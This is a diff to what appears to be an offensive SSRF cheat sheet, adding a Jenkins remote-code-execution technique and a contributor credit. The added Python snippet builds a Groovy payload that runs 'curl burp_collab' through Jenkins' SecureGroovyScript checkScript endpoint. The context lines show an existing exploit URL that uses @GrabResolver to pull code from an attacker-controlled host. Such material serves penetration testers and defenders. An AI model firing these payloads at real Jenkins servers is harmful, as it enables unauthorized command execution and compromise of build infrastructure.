@@ -471,6 +471,14 @@ Follow the instructions here to achieve RCE via GET: [Hacking Jenkins Part 2 - A
 /org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='orange.tw', root='http://SSRF_CANARY/')%0a@Grab(group='tw.orange', module='poc', version='1')%0aimport Orange;
 ```
 
+**RCE via Groovy**
+
+```
+cmd = 'curl burp_collab'
+pay = 'public class x {public x(){"%s".execute()}}' % cmd
+data = 'http://jenkins.internal/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=' + urllib.quote(pay)
+```
+
 <div id="hystrix"></div>
 
 ## Hystrix Dashboard
@@ -764,3 +772,4 @@ Thank you to the following people that have contributed to this post:
 - [@marcioalm - Tomcat 6 Gopher RCE](https://twitter.com/marcioalm)
 - [@vtnahira - OpenTSDB RCE](https://twitter.com/vtnahira)
 - [@fransrosen - SSRF canaries concept](https://twitter.com/fransrosen)
+- [@theabrahack - RCE via Jenkins Groovy](https://twitter.com/@theabrahack)
